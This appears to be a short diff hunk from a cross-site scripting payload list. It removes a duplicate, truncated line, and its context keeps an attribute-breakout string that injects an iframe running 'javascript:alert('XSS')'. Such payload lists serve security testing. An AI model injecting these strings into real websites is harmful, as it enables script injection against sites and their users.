@@ -16,7 +16,7 @@ http://66.102.7.147/">XSS
 
 
 "><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
-"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1
+
 
 
 
